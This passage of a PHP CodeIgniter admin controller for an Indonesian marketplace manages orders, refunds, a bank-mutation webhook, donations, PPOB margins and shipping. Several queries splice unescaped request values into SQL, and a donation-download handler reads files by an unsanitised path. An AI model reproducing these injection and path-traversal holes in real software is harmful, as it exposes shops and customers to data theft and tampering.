        if (isset($_GET['status'])){
            $data = array('proses'=>$this->input->get('status'));
            $where = array('id_penjualan'=>$this->input->get('id'),'status_pembeli'=>'konsumen');
            $this->model_app->update('rb_penjualan', $data, $where);
            notif_perubahan_status($this->input->get('status'),$this->input->get('id'));
            redirect('administrator/penjualan_konsumen');
        }
        
        // Transaksi Batal/Refund/Hapus
        if (isset($_GET['batal'])){
            $rek = $this->db->query("SELECT id_rekening FROM `rb_rekening` ORDER BY RAND() DESC LIMIT 1")->row_array();
            $row = $this->db->query("SELECT a.jumlah, a.diskon, a.harga_jual, sum((a.jumlah*a.harga_jual)-a.diskon) as total_belanja FROM rb_penjualan_detail a where a.id_penjualan='".cetak($_GET['id'])."'")->row_array();
            $ong = $this->db->query("SELECT kode_transaksi, ongkir, id_pembeli FROM rb_penjualan where id_penjualan='".cetak($_GET['id'])."'")->row_array();
            $cek_pembayaran = $this->db->query("SELECT * FROM rb_penjualan_otomatis where kode_transaksi='$ong[kode_transaksi]'")->row_array();
            // Kembalikan dana jika sudah dibayar
            if ($cek_pembayaran['pembayaran']=='1'){
                $dana_kembali = ($row['total_belanja']+$ong['ongkir']);
                $data_refund = array('id_rekening_reseller'=>$rek['id_rekening'],
						'id_reseller'=>$ong['id_pembeli'],
						'nominal'=>$dana_kembali,
						'status'=>'Sukses',
						'transaksi'=>'Kredit',
						'keterangan'=>"Refund Orders $ong[kode_transaksi]",
						'akun'=>'konsumen',
						'waktu_withdraw'=>date('Y-m-d H:i:s'));
				$this->model_app->insert('rb_withdraw',$data_refund);
            }
            
            notif_order_cancel($this->input->get('id'),$this->input->get('batal'));
            
            $id = array('id_penjualan' =>cetak($_GET['id']));
		    $this->model_app->delete('rb_penjualan',$id);
		    $this->model_app->delete('rb_penjualan_detail',$id);
            
            redirect('administrator/penjualan_konsumen');
        }
        
        // Pembayaran Sudah Diterima
        if (isset($_GET['terima'])){
            $ref = $this->db->query("SELECT a.kode_transaksi, b.nama_reseller, b.referral FROM rb_penjualan a JOIN rb_reseller b ON a.id_penjual=b.id_reseller where a.id_penjualan='".$this->input->get('terima')."' AND a.status_penjual='reseller'")->row_array();
            $data_payment = array('pembayaran'=>'1');
            $where_payment = array('kode_transaksi'=>$ref['kode_transaksi']);
            $this->model_app->update('rb_penjualan_otomatis', $data_payment, $where_payment);
            notif_pembayaran_sukses($ref['kode_transaksi']);
            redirect('administrator/penjualan_konsumen');
        }

		$this->session->unset_userdata('idp');
		$id = $this->session->id_reseller;
        if (isset($_GET['bulan'])){
            $data['record'] = $this->model_reseller->penjualan_list_konsumen_bulan('reseller',strip_tags($_GET['bulan']));
            $this->load->view($this->uri->segment(1).'/additional/mod_penjualan/view_penjualan_konsumen_print',$data);
        }else{
            $data['record'] = $this->model_reseller->penjualan_list_konsumen_admin('reseller');
		    $this->template->load($this->uri->segment(1).'/template',$this->uri->segment(1).'/additional/mod_penjualan/view_penjualan_konsumen',$data);
        }
    }

    function grouporder(){
		cek_session_akses('pembayaran_konsumen',$this->session->id_session);
        $ex = explode(':',cetak($this->input->post('id')));
        $data['records'] = $this->model_reseller->group_order($ex[0],'reseller',$ex[1]);
        $this->load->view($this->uri->segment(1).'/additional/mod_penjualan/view_penjualan_group',$data);
	}

	function detail_penjualan_konsumen(){
        cek_session_akses('pembayaran_konsumen',$this->session->id_session);
        if (isset($_POST['submit'])){
                $data1 = array('no_resi'=>$this->input->post('no_resi'),
                                'proses'=>'3');
                $where = array('id_penjualan' => $this->uri->segment(3));
                $this->model_app->update('rb_penjualan', $data1, $where);
            redirect($this->uri->segment(1).'/detail_penjualan_konsumen/'.$this->uri->segment(3));
        }else{
            $data['rows'] = $this->model_reseller->penjualan_konsumen_detail_reseller($this->uri->segment(3))->row_array();
            $data['record'] = $this->model_app->view_join_where('rb_penjualan_detail','rb_produk','id_produk',array('id_penjualan'=>$this->uri->segment(3)),'id_penjualan_detail','ASC');
            $this->template->load($this->uri->segment(1).'/template',$this->uri->segment(1).'/additional/mod_penjualan/view_penjualan_konsumen_detail',$data);
        }
    }
    
    function proses_penjualan_konsumen(){
		cek_session_akses('pembayaran_konsumen',$this->session->id_session);
        $data = array('proses'=>$this->uri->segment(4));
        $where = array('id_penjualan' => $this->uri->segment(3));
        $this->model_app->update('rb_penjualan', $data, $where);
        redirect($this->uri->segment(1).'/penjualan_konsumen');
    }
    
    function proses_penjualan_konsumen_detail(){
		cek_session_akses('pembayaran_konsumen',$this->session->id_session);
        $data = array('proses'=>$this->uri->segment(4));
		$where = array('id_penjualan' => $this->uri->segment(3));
		$this->model_app->update('rb_penjualan', $data, $where);
		redirect($this->uri->segment(1).'/detail_penjualan_konsumen/'.$this->uri->segment(3));
    }

    function edit_penjualan_konsumen(){
		cek_session_akses('pembayaran_konsumen',$this->session->id_session);
		if (isset($_POST['submit1'])){
			$data = array('kode_transaksi'=>$this->input->post('a'),
			        	  'id_pembeli'=>$this->input->post('b'),
			        	  'waktu_transaksi'=>$this->input->post('c'));
			$where = array('id_penjualan' => $this->input->post('idp'));
			$this->model_app->update('rb_penjualan', $data, $where);
			redirect($this->uri->segment(1).'/edit_penjualan_konsumen/'.$this->input->post('idp'));

		}elseif(isset($_POST['submit'])){
			$cekk = $this->db->query("SELECT * FROM rb_penjualan_detail where id_penjualan='".$this->input->post('idp')."' AND id_produk='".$this->input->post('aa')."'")->row_array();
			$jual = $this->model_reseller->jual_reseller($this->input->post('id_penjual'), $this->input->post('aa'))->row_array();
            $beli = $this->model_reseller->beli_reseller($this->input->post('id_penjual'), $this->input->post('aa'))->row_array();
            $stok = $beli['beli']-$jual['jual']+$cekk['jumlah'];
            if ($this->input->post('dd') > $stok){
            	echo "<script>window.alert('Maaf, Stok $stok Tidak Mencukupi!');
                                  window.location=('".base_url().$this->uri->segment(1)."/edit_penjualan_konsumen/".$this->input->post('idp')."')</script>";
            }else{
				if ($this->input->post('idpd')==''){
					$data = array('id_penjualan'=>$this->input->post('idp'),
			        			  'id_produk'=>$this->input->post('aa'),
			        			  'jumlah'=>$this->input->post('dd'),
			        			  'harga_jual'=>$this->input->post('bb'),
			        			  'satuan'=>$this->input->post('ee'));
					$this->model_app->insert('rb_penjualan_detail',$data);
				}else{
			        $data = array('id_produk'=>$this->input->post('aa'),
			        			  'jumlah'=>$this->input->post('dd'),
			        			  'harga_jual'=>$this->input->post('bb'),
			        			  'satuan'=>$this->input->post('ee'));
					$where = array('id_penjualan_detail' => $this->input->post('idpd'));
					$this->model_app->update('rb_penjualan_detail', $data, $where);
				}
				redirect($this->uri->segment(1).'/edit_penjualan_konsumen/'.$this->input->post('idp'));
			}
			
		}else{
			$data['rows'] = $this->model_reseller->penjualan_konsumen_detail_reseller($this->uri->segment(3))->row_array();
			$data['record'] = $this->model_app->view_join_where('rb_penjualan_detail','rb_produk','id_produk',array('id_penjualan'=>$this->uri->segment(3)),'id_penjualan_detail','DESC');
			$data['barang'] = $this->model_app->view_ordering('rb_produk','id_produk','ASC');
			$data['konsumen'] = $this->model_app->view_ordering('rb_konsumen','id_konsumen','ASC');
			if ($this->uri->segment(4)!=''){
				$data['row'] = $this->model_app->view_where('rb_penjualan_detail',array('id_penjualan_detail'=>$this->uri->segment(4)))->row_array();
			}
			$this->template->load($this->uri->segment(1).'/template',$this->uri->segment(1).'/additional/mod_penjualan/view_penjualan_konsumen_edit',$data);
		}
    }
    
    function delete_penjualan_konsumen_detail(){
        cek_session_akses('pembayaran_konsumen',$this->session->id_session);
		$id = array('id_penjualan_detail' => $this->uri->segment(4));
		$this->model_app->delete('rb_penjualan_detail',$id);
		redirect($this->uri->segment(1).'/edit_penjualan_konsumen/'.$this->uri->segment(3));
	}
    
    function delete_penjualan_konsumen(){
        cek_session_akses('pembayaran_konsumen',$this->session->id_session);
		$id = array('id_penjualan' => $this->uri->segment(3));
		$this->model_app->delete('rb_penjualan',$id);
		$this->model_app->delete('rb_penjualan_detail',$id);
		redirect($this->uri->segment(1).'/penjualan_konsumen');
	}

    // Controller Modul Image Slider

	function imagesslider(){
        cek_session_akses('imagesslider',$this->session->id_session);
		$data['record'] = $this->model_app->slide();
		$this->template->load('administrator/template','administrator/mod_slider/view_slider',$data);
	}

	function tambah_imagesslider(){
		cek_session_akses('imagesslider',$this->session->id_session);
		if (isset($_POST['submit'])){
			$this->model_app->slide_tambah();
			redirect($this->uri->segment(1).'/imagesslider');
		}else{
			$this->template->load('administrator/template','administrator/mod_slider/view_slider_tambah');
		}
	}

    function isJson($string) {
        json_decode($string);
        return json_last_error() === JSON_ERROR_NONE;
     }
     

	function edit_imagesslider(){
		cek_session_akses('imagesslider',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
            $keterangan = [
                'judul' => $this->db->escape_str($_POST['a1']),
                'subjudul' => $this->db->escape_str($_POST['a2']),
                'deskripsi' => $this->db->escape_str($_POST['a3']),
                'video' => $this->db->escape_str($_POST['a4'])
            ];
            $_POST['a'] = str_replace('\/','/',json_encode($keterangan));
			$this->model_app->slide_update();
			redirect($this->uri->segment(1).'/imagesslider');
		}else{
			$data['rows'] = $this->model_app->slide_edit($id)->row_array();
            $data['rows_slider'] = "";
            if($this->isJson($data['rows']['keterangan'])){
                $data['rows_slider'] = json_decode($data['rows']['keterangan']);
            }
			$this->template->load('administrator/template','administrator/mod_slider/view_slider_edit',$data);
		}
	}

	function delete_imagesslider(){
        cek_session_akses('imagesslider',$this->session->id_session);
		$id = $this->uri->segment(3);
		$this->model_app->slide_delete($id);
		redirect($this->uri->segment(1).'/imagesslider');
    }
    
    function mutasi_ty35fgdfgd777bba064b72be(){
        $data = json_decode(file_get_contents('php://input'), true);
        $row = $this->db->query("SELECT api_mutasibank, api_rajaongkir FROM identitas where id_identitas='1'")->row_array();
		$api_token = "$row[api_mutasibank]";
		$token = $data['api_key'];
		if ($api_token != $token) {
			echo "invalid api token";
			exit;
		}

		//MODULE BANK (bca,bri,bni,mandiri)
		$module = $data['module'];
		foreach ($data['data_mutasi'] as $dtm) { //DATA MUTASI
			$date = $dtm['transaction_date']; //Tanggal Transaksi terjadi di bank
			$note = $dtm['description']; //Note atau deskripsi dari bank
			$type = $dtm['type']; //Tipe transaksi (DB ATAU CR)
			$amount = $dtm['amount']; //Jumlah Dana
			$saldo = $dtm['balance']; //Saldo saat ini
// 			$insert_data = $date.' | '.$type.' | '.$amount.' | '.$saldo;
			
// 			$data_refund = array('title'=>$insert_data,
// 				'created'=>date('Y-m-d H:i:s'),
// 				'modified'=>date('Y-m-d H:i:s'),
// 				'status'=>1);
// 		    $this->model_app->insert('rb_withdraw',$data_refund);
		
			if ($type=='CR'){
			$unik = $this->db->query("SELECT a.*, b.proses, SUBSTR(timediff(now(), a.waktu_proses),1,2) as durasi FROM `rb_penjualan_otomatis` a JOIN rb_penjualan b ON a.kode_transaksi=b.kode_transaksi where a.nominal='$amount' AND b.kode_kurir!='0' AND b.proses='0' AND SUBSTR(timediff(now(), a.waktu_proses),1,2)<'24' GROUP BY b.kode_transaksi");
                if ($unik->num_rows()=='1'){
                    $mut = $unik->row_array();
                    $datax = array('pembayaran'=>'1','status_trx'=>'berhasil');
                    $where = array('kode_transaksi' => $mut['kode_transaksi']);
                    $this->model_app->update('rb_penjualan_otomatis', $datax, $where);

                    $data_idp = array('proses'=>'2');
                    $where_idp = array('kode_transaksi'=>$mut['kode_transaksi'],'status_pembeli'=>'konsumen');
                    $this->model_app->update('rb_penjualan', $data_idp, $where_idp);

                    $tgl_kirim = date("d-m-Y H:i:s");
                    
                    $logo = $this->db->query("SELECT * FROM logo ORDER BY id_logo DESC LIMIT 1")->row_array();
                    $iden = $this->db->query("SELECT * FROM identitas where id_identitas='1'")->row_array();
                    $cek_kons = $this->db->query("SELECT b.id_pembeli FROM rb_penjualan_otomatis a JOIN rb_penjualan b ON a.kode_transaksi=b.kode_transaksi where b.status_pembeli='konsumen' AND a.kode_transaksi='$mut[kode_transaksi]' GROUP BY b.id_pembeli")->row_array();
                    $kons = $this->model_reseller->profile_konsumen($cek_kons['id_pembeli'])->row_array();
                    $subject      = "$iden[pengirim_email] - Pembayaran Sukses,..";
                    $message  = "<html><body><span style='font-size:18px; color:green'>Selamat Pembayaran anda Sukses.</span><br>
                                            Hai $kons[nama_lengkap]! Kami telah menerima pembayaran untuk pesanan anda #$mut[kode_transaksi]. <br>
                                            Kami juga telah menginformasikan kepada penjual agar segera memproses pesanannya.<br> 
                                            Silahkan cek disini untuk perkembangan status pesanan : <a href='".base_url()."konfirmasi/tracking/$mut[kode_transaksi]'>Disini</a>.<br><br>

                                            Terima kasih telah berbelanja di $iden[url].</body></html> \n";
                    echo kirim_email($subject,$message,$kons['email']);


                    $penjual = $this->db->query("SELECT b.id_penjual FROM rb_penjualan_otomatis a JOIN rb_penjualan b ON a.kode_transaksi=b.kode_transaksi where b.status_pembeli='konsumen' AND a.kode_transaksi='$mut[kode_transaksi]' AND b.kode_kurir!='0' GROUP BY b.id_penjual");
                    foreach ($penjual->result_array() as $row){
                        $subject_ress      = "$iden[pengirim_email] - Pembayaran dari Pembeli Sukses,..";
                        $ress = $this->db->query("SELECT * FROM rb_reseller where id_reseller='$row[id_penjual]'")->row_array();

                        $message_ress  = "<html><body><span style='font-size:18px; color:green'>Selamat Pembayaran dari pembeli Sukses.</span><br>
                                                Hai $ress[nama_reseller]! Kami telah menerima pembayaran pesanan dari konsumen anda untuk Invoice <a href='".base_url()."konfirmasi/tracking/$mut[kode_transaksi]'>#$mut[kode_transaksi]</a>. <br>
                                                Kami juga telah menginformasikan kepada konsumen agar anda segera memproses pesanannya.<br> 
                                                Silahkan login ke akun anda dan proses pesanan konsumen segera, Terima kasih.<br><br>

                                                Terima kasih telah berjualan di $iden[url].</body></html> \n";
                        echo kirim_email($subject_ress,$message_ress,$ress['email']);
                    }
                }
            }
		}
	}

	function mutasi(){
        cek_session_akses('mutasi',$this->session->id_session);
        $row = $this->db->query("SELECT api_mutasibank, api_rajaongkir FROM identitas where id_identitas='1'")->row_array();
        if ($this->uri->segment(3)==''){
            $curl = curl_init();
            curl_setopt_array($curl, array(
            CURLOPT_URL => "https://mutasibank.co.id/api/v1/accounts",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "GET",
            CURLOPT_HTTPHEADER => array(
            "Authorization: $row[api_mutasibank]"
            ),
            ));
            $response_akun = curl_exec($curl);
            curl_close($curl);

            $obj = json_decode($response_akun);
            foreach($obj->data as $item){ $akun[] = $item->id; }
			$akun_bank = $akun[0];
		}else{
			$akun_bank = $this->uri->segment(3);
		}

		$curl = curl_init();
		$date = date_create(date('Y-m-d'));
		date_sub($date,date_interval_create_from_date_string("+7 days"));
		curl_setopt_array($curl, array(
		CURLOPT_URL => "https://mutasibank.co.id/api/v1/statements/$akun_bank",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 0,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS => array('date_from' => date_format($date,"Y-m-d"),'date_to' => date('Y-m-d')),
		CURLOPT_HTTPHEADER => array(
			"Authorization: $row[api_mutasibank]"
		),
		));
		$data['response'] = curl_exec($curl);
		curl_close($curl);
		$data['title'] = 'Daftar Mutasi Bank';
		$this->template->load('administrator/template','administrator/view_mutasi',$data);
    }

    function donasi(){
		cek_session_akses('donasi',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_donasi','id_donasi','DESC');
		$this->template->load('administrator/template','administrator/mod_donasi/view',$data);
    }

    function lihat_donasi(){
		cek_session_akses('donasi',$this->session->id_session);
        $data['row'] = $this->db->query("SELECT a.*, b.nama_bank, b.no_rekening, b.pemilik_rekening FROM rb_donasi a LEFT JOIN rb_rekening b ON a.id_rekening=b.id_rekening where a.id_donasi='".$this->input->post('id')."'")->row_array();
		$this->load->view('administrator/mod_donasi/lihat',$data);
    }

    function donasi_file(){
        cek_session_akses('donasi',$this->session->id_session);
        $name = $this->uri->segment(3);
        $data = file_get_contents("asset/files/".$name);
        force_download($name, $data);
	}
    
    function delete_donasi(){
        cek_session_akses('donasi',$this->session->id_session);
        $id = array('id_donasi' => $this->uri->segment(3));
        $this->model_app->delete('rb_donasi',$id);
        redirect($this->uri->segment(1).'/donasi');
    }


    // Controller Modul ppob_margin

    function ppob_margin(){
        cek_session_akses('ppob_margin',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_ppob_margin','id_ppob_margin','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_ppob/view_ppob_margin',$data);
    }

    function tambah_ppob_margin(){
        cek_session_akses('ppob_margin',$this->session->id_session);
        if (isset($_POST['submit'])){
            $ex = explode('|',$this->input->post('produk'));
            $data = array('id_jenis'=>ppob($this->input->post('transaksi')),
                        'id_ppob'=>$this->input->post('operator'),
                        'kode_ppob'=>$ex[0],
                        'nama_ppob'=>$ex[2],
                        'harga'=>$ex[1],
                        'margin'=>($this->input->post('margin')-$ex[1]));
            $this->model_app->insert('rb_ppob_margin',$data);
            redirect('administrator/ppob_margin');
        }else{
            $row = $this->db->query("SELECT maps FROM identitas where id_identitas='1'")->row_array();
            $data['maps'] = $row['maps'];
            if ($row['maps']!='|'){
                $maps = explode('|',$row['maps']);
                $url1 = 'https://tripay.co.id/api/v2/pembelian/operator/';
                $header = array(
                'Accept: application/json',
                'Authorization: Bearer '.$maps[0], // Ganti [apikey] dengan API KEY Anda
                );
                $ch1 = curl_init();
                curl_setopt($ch1, CURLOPT_URL, $url1);
                curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch1, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch1, CURLOPT_POST, 1);
                $operator = curl_exec($ch1);
                if(curl_errno($ch1)){
                    return 'Request Error:' . curl_error($ch1);
                }
                $data['operator'] = json_decode($operator);
            }
            $this->template->load('administrator/template','administrator/additional/mod_ppob/view_ppob_margin_tambah',$data);
        }
    }

    function edit_ppob_margin(){
        cek_session_akses('ppob_margin',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('margin'=>($this->input->post('margin')-$this->input->post('produk')));
            $where = array('id_ppob_margin' => $this->input->post('id'));
            $this->model_app->update('rb_ppob_margin', $data, $where);
            redirect('administrator/ppob_margin');
        }else{
            $row = $this->db->query("SELECT maps FROM identitas where id_identitas='1'")->row_array();
            $data['maps'] = $row['maps'];
            if ($row['maps']!='|'){
                $maps = explode('|',$row['maps']);
                $url1 = 'https://tripay.co.id/api/v2/pembelian/operator/';
                $header = array(
                'Accept: application/json',
                'Authorization: Bearer '.$maps[0], // Ganti [apikey] dengan API KEY Anda
                );
                $ch1 = curl_init();
                curl_setopt($ch1, CURLOPT_URL, $url1);
                curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch1, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch1, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch1, CURLOPT_POST, 1);
                $operator = curl_exec($ch1);
                if(curl_errno($ch1)){
                    return 'Request Error:' . curl_error($ch1);
                }
                $data['operator'] = json_decode($operator);
            }
            $data['rows'] = $this->model_app->edit('rb_ppob_margin',array('id_ppob_margin'=>$id))->row_array();
            $this->template->load('administrator/template','administrator/additional/mod_ppob/view_ppob_margin_edit',$data);
        }
    }

    function delete_ppob_margin(){
        cek_session_akses('ppob_margin',$this->session->id_session);
        $id = array('id_ppob_margin' => $this->uri->segment(3));
        $this->model_app->delete('rb_ppob_margin',$id);
        redirect('administrator/ppob_margin');
    }

    function jenis_ppob(){
        if (isset($_POST['transaksi_id'])){
			$row = $this->db->query("SELECT maps FROM identitas where id_identitas='1'")->row_array();
			$maps = explode('|',$row['maps']);

            $data['transaksi_id'] = ppob($this->input->post('transaksi_id'));
            $url = 'https://tripay.co.id/api/v2/pembelian/operator/';
            $header = array(
            'Accept: application/json',
            'Authorization: Bearer '.$maps[0], // Ganti [apikey] dengan API KEY Anda
            );

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
            curl_setopt($ch, CURLOPT_POST, 1);
            $produk = curl_exec($ch);
            if(curl_errno($ch)){
                return 'Request Error:' . curl_error($ch);
            }
            $data['produk'] = json_decode($produk);
            $this->load->view('administrator/additional/mod_ppob/view_produk_jenis',$data);	
        }else{
            redirect('home');
        }	
    }

    function produk_ppob(){
        if (isset($_POST['operator_id'])){
			$row = $this->db->query("SELECT maps FROM identitas where id_identitas='1'")->row_array();
			$maps = explode('|',$row['maps']);

            $data['operator_id'] = $this->input->post('operator_id');
            $url = 'https://tripay.co.id/api/v2/pembelian/produk/';
            $header = array(
            'Accept: application/json',
            'Authorization: Bearer '.$maps[0], // Ganti [apikey] dengan API KEY Anda
            );

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
            curl_setopt($ch, CURLOPT_POST, 1);
            $produk = curl_exec($ch);
            if(curl_errno($ch)){
                return 'Request Error:' . curl_error($ch);
            }
            $data['produk'] = json_decode($produk);
            $this->load->view('administrator/additional/mod_ppob/view_produk',$data);	
        }else{
            redirect('home');
        }	
    }
    
    // Controller Modul Ongkir Driver

	function ongkir_driver(){
		cek_session_akses('ongkir_driver',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT * FROM rb_driver_ongkir a JOIN rb_jenis_kendaraan b ON a.id_jenis_kendaraan=b.id_jenis_kendaraan ORDER BY a.id_jenis_kendaraan ASC");
		$this->template->load('administrator/template','administrator/additional/mod_ongkir_driver/view',$data);
	}

	function tambah_ongkir_driver(){
		cek_session_akses('ongkir_driver',$this->session->id_session);
		if (isset($_POST['submit'])){
            $posisi = cetak($this->input->post('kecamatan_id'));
            $tujuan = cetak($this->input->post('kecamatan_idt'));
            $provinsi_kota = cetak($this->input->post('provinsi_id')).':'.cetak($this->input->post('kota_id')).'|'.cetak($this->input->post('provinsi_idt')).':'.cetak($this->input->post('kota_idt'));
            $data = array('id_jenis_kendaraan'=>cetak($this->input->post('a')),
                        'provinsi_kota'=>$provinsi_kota,
                        'posisi'=>$posisi,
                        'tujuan'=>$tujuan,
                        'ongkir'=>cetak($this->input->post('d')),
                        'keterangan'=>cetak($this->input->post('e')));
			$this->model_app->insert('rb_driver_ongkir',$data);
			redirect($this->uri->segment(1).'/ongkir_driver');
		}else{
			$this->template->load('administrator/template','administrator/additional/mod_ongkir_driver/view_tambah');
		}
	}

	function edit_ongkir_driver(){
		cek_session_akses('ongkir_driver',$this->session->id_session);
		$id = $this->uri->segment(3);
		if (isset($_POST['submit'])){
			$posisi = cetak($this->input->post('kecamatan_id'));
            $tujuan = cetak($this->input->post('kecamatan_idt'));
            $provinsi_kota = cetak($this->input->post('provinsi_id')).':'.cetak($this->input->post('kota_id')).'|'.cetak($this->input->post('provinsi_idt')).':'.cetak($this->input->post('kota_idt'));
            $data = array('id_jenis_kendaraan'=>cetak($this->input->post('a')),
                        'provinsi_kota'=>$provinsi_kota,
                        'posisi'=>$posisi,
                        'tujuan'=>$tujuan,
                        'ongkir'=>cetak($this->input->post('d')),
                        'keterangan'=>cetak($this->input->post('e')));
			$where = array('id_driver_ongkir' => $this->input->post('id'));
			$this->model_app->update('rb_driver_ongkir', $data, $where);
			redirect($this->uri->segment(1).'/ongkir_driver');
		}else{
            $proses = $this->model_app->edit('rb_driver_ongkir', array('id_driver_ongkir' => $id))->row_array();
			$data = array('rows' => $proses);
			$this->template->load('administrator/template','administrator/additional/mod_ongkir_driver/view_edit',$data);
		}
	}

	function delete_ongkir_driver(){
		cek_session_akses('ongkir_driver',$this->session->id_session);
        $id = array('id_driver_ongkir' => $this->uri->segment(3));
		$this->model_app->delete('rb_driver_ongkir',$id);
		redirect($this->uri->segment(1).'/ongkir_driver');
    }

    function sopir(){
		cek_session_akses('sopir',$this->session->id_session);
        $data['record'] = $this->db->query("SELECT b.nama_lengkap, b.kecamatan_id, b.kota_id, c.jenis_kendaraan, a.* FROM `rb_sopir` a JOIN rb_konsumen b ON a.id_konsumen=b.id_konsumen
        JOIN rb_jenis_kendaraan c ON a.id_jenis_kendaraan=c.id_jenis_kendaraan ORDER By a.id_sopir DESC");
		$this->template->load('administrator/template','administrator/additional/mod_ongkir_driver/view_sopir',$data);
    }
    
    function detail_sopir(){
		cek_session_akses('sopir',$this->session->id_session);
        $detail = $this->db->query("SELECT b.nama_lengkap, b.kecamatan_id, b.kota_id, c.jenis_kendaraan, a.* FROM `rb_sopir` a JOIN rb_konsumen b ON a.id_konsumen=b.id_konsumen
        JOIN rb_jenis_kendaraan c ON a.id_jenis_kendaraan=c.id_jenis_kendaraan where a.id_sopir='".cetak($this->input->post('id'))."'")->row_array();
        $data = array('row' => $detail);
        $this->load->view('administrator/additional/mod_ongkir_driver/view_sopir_detail',$data);
    }

    
    function verifikasi_sopir(){
        cek_session_akses('sopir',$this->session->id_session);
        $data = array('aktif'=>$this->uri->segment(4));
        $where = array('id_sopir' => $this->uri->segment(3));
        $this->model_app->update('rb_sopir', $data, $where);
        redirect('administrator/sopir');
    }

    function delete_sopir(){
		cek_session_akses('sopir',$this->session->id_session);
        $id = array('id_sopir' => $this->uri->segment(3));
		$this->model_app->delete('rb_sopir',$id);
		redirect($this->uri->segment(1).'/sopir');
    }

    // Controller Modul Kategori Produk

    function kurir_rajaongkir(){
        cek_session_akses('kurir_rajaongkir',$this->session->id_session);
        $data['record'] = $this->model_app->view_ordering('rb_kurir','id_kurir','DESC');
        $this->template->load('administrator/template','administrator/additional/mod_rajaongkir/view',$data);
    }

    function tambah_kurir_rajaongkir(){
        cek_session_akses('kurir_rajaongkir',$this->session->id_session);
        if (isset($_POST['submit'])){
            $data = array('kode_kurir'=>$this->input->post('a'),
                        'nama_kurir'=>$this->input->post('b'));
            $this->model_app->insert('rb_kurir',$data);
            redirect('administrator/kurir_rajaongkir');
        }else{
            $this->template->load('administrator/template','administrator/additional/mod_rajaongkir/view_tambah');
        }
    }

    function edit_kurir_rajaongkir(){
        cek_session_akses('kurir_rajaongkir',$this->session->id_session);
        $id = $this->uri->segment(3);
        if (isset($_POST['submit'])){
            $data = array('kode_kurir'=>$this->input->post('a'),
                        'nama_kurir'=>$this->input->post('b'));
            $where = array('id_kurir' => $this->input->post('id'));
            $this->model_app->update('rb_kurir', $data, $where);
            redirect('administrator/kurir_rajaongkir');
        }else{
            $edit = $this->model_app->edit('rb_kurir',array('id_kurir'=>$id))->row_array();
            $data = array('rows' => $edit);
            $this->template->load('administrator/template','administrator/additional/mod_rajaongkir/view_edit',$data);
        }
    }

    function delete_kurir_rajaongkir(){
        cek_session_akses('kurir_rajaongkir',$this->session->id_session);
        $id = array('id_kurir' => $this->uri->segment(3));
        $this->model_app->delete('rb_kurir',$id);
        redirect('administrator/kurir_rajaongkir');
    }

    public function komplain(){
		cek_session_akses('komplain',$this->session->id_session);
		$data['komplain'] = $this->db->query("SELECT a.*, b.kode_transaksi, b.id_penjual, b.ongkir, c.nama_reseller, d.nama_lengkap FROM rb_pusat_bantuan a JOIN rb_penjualan b ON a.id_penjualan=b.id_penjualan JOIN rb_reseller c ON a.id_terlapor=c.id_konsumen 
                                                JOIN rb_konsumen d ON a.id_pelapor=d.id_konsumen ORDER BY id_pusat_bantuan DESC");
		$this->template->load('administrator/template','administrator/additional/mod_komplain/view',$data);
    }
    
    public function room(){
        cek_session_akses('komplain',$this->session->id_session);
        if (isset($_GET['status'])){
			$data_komplain = array('putusan'=>cetak($this->input->get('status')));
			$where_komplain = array('id_pusat_bantuan'=>cetak($this->uri->segment('3')));
            $this->model_app->update('rb_pusat_bantuan', $data_komplain, $where_komplain);
			redirect('administrator/room/'.cetak($this->uri->segment('3')));
		}

        $idp = $this->db->query("SELECT id_penjualan FROM rb_pusat_bantuan where id_pusat_bantuan='".cetak($this->uri->segment(3))."'")->row_array();
        $id_penjualan = $idp['id_penjualan'];

        $data['detail'] = $this->db->query("SELECT b.*, c.nama_lengkap as pelapor, d.nama_lengkap as terlapor FROM rb_penjualan a JOIN rb_pusat_bantuan b ON a.id_penjualan=b.id_penjualan 
                                                JOIN rb_konsumen c ON b.id_pelapor=c.id_konsumen JOIN rb_konsumen d ON b.id_terlapor=d.id_konsumen
                                                    where a.id_penjualan='".cetak($id_penjualan)."'")->row_array();
        $data['rows'] = $this->model_reseller->penjualan_konsumen_detail(cetak($id_penjualan))->row_array();
        $data['record'] = $this->model_app->view_join_where('rb_penjualan_detail','rb_produk','id_produk',array('id_penjualan'=>cetak($id_penjualan)),'id_penjualan_detail','ASC');
